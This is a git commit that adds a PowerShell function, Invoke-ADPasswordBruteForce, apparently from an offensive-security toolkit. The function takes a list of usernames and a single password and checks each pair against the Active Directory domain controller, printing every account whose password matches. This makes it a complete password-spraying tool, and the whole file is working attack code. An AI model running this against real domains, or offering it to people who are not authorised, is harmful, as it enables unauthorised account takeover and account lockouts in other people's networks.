8340f302d034f55f8bf4e16b8e3cbf5e5753540b
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2018-04-11 14:14:29 -0400

    Create Invoke-ADPasswordBruteForce.ps1

---
+++ scripts/Invoke-ADPasswordBruteForce.ps1
@@ -0,0 +1,35 @@
+Function Invoke-ADPasswordBruteForce {
+	param(
+		[Parameter(Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Username,
+		[Parameter(Mandatory=$False)]
+		[string]$Domain = (Get-Item env:USERDOMAIN).Value,
+		[Parameter(Mandatory=$True)]
+		[string]$Password
+	)
+	
+	BEGIN {
+		Write-Output "[+] bruteforcing users in the ""$($Domain)"" domain using the password ""$($Password)"""
+	}
+	
+	PROCESS {
+		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+		ForEach($User in $Username) {
+			Try {
+				$Context = [System.DirectoryServices.AccountManagement.ContextType]::Domain
+				$PrincipalContext =  New-Object System.DirectoryServices.AccountManagement.PrincipalContext($Context, $Domain)
+				
+				If($PrincipalContext.ValidateCredentials($User, $password) -eq $True) {
+					Write-Output "[+] $($User) password is $($Password)"
+				}
+			} Catch {
+				Write-Output "[-] Error reaching the server. Aborting"
+				exit
+			}
+		}
+	}
+	
+	END {
+		Write-Output "[+] Process completed..."
+	}
+}
